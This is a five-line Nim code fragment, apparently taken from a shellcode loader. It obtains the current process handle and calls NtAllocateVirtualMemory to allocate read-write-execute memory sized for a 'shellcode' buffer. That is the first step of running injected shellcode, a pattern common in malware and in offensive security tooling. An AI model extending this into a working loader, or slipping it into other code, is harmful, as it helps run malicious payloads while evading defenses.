var rPtr: LPVOID
var sc_size = cast[SIZE_T](shellcode.len)
var pHandle = GetCurrentProcess()
var res: WINBOOL
res = NtAllocateVirtualMemory(pHandle, addr rPtr, 0, addr sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
